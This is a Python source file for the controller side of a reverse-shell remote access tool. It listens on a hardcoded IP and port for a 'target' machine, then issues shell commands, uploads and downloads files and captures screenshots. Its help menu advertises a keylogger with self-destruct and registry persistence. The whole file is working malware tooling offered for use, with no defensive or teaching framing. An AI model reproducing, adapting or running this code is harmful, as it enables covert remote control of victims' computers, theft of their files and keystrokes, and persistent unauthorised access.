import os
import json
import socket

import termcolor


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def reliable_receive():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()



def communication():
    count = 1
    while True:
        command = input(termcolor.colored('* Shell~%s: ' % str(ip), 'blue'))
        reliable_send(command)
        
        #QUIT
        if command == 'quit' or command == 'exit':
            break
        
        #CLEAR SCREEN
        elif command == 'clear':
            if os.sys.platform.startswith('win'):
                os.system('cls')
            elif os.sys.platform.startswith('linux'):
                os.system('clear')
        
        #SCREENSHOT
        elif command == '-Ss':
            f = open('screenshot%d.png' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count+=1
        #CD
        elif command.startswith('cd'):
            result = reliable_receive()
            if result is False:
                print(termcolor.colored("Directory not found or misspelled", 'red'))
            else:
                print(termcolor.colored(f'Changed Directory to: {result}', 'green'))

        #UPLOAD
        elif command.startswith('-U'):
            upload_file(command[3:])

        #DOWNLOAD
        elif command.startswith('-D'):
            download_file(command[3:])
            # data = reliable_receive()
            # print(data)

        #HELP
        elif command == 'help':
            print(termcolor.colored('''
            [!!]Commands are CaSe SeNsItIvE [!!]
            ''', 'red')+'\n'+termcolor.colored('''\n
            quit                                --> Quit The Current Session
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory
            -U *file name*                      --> Uploads a File to The Target Machine
            -D *file name*                      --> Downloads a File from Target Machine
            -Kstart                             --> Starts Keylogger
            -Kdump                              --> Prints the Keystrokes Inputted by Target Machine
            -Kstop                              --> Stop and Self Destruct Keylogger File 
            persistence *RegName* *fileName*    --> create Persistence In Registry
            \n''', 'yellow'))
        else:
            result = reliable_receive()
            print(termcolor.colored(result, 'green'))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
sock.bind(('192.168.0.105', 9797)) #change IP Address here
print(termcolor.colored('[+] Port Listening for Targets....', 'yellow'))
sock.listen(5)
target, ip = sock.accept()

print(termcolor.colored(f'[+] Target found from IP ADDRESS: ', 'green'), end='')
print(termcolor.colored(f'{str(ip[0]).strip()}', 'red', attrs=['bold', 'underline']))
communication()
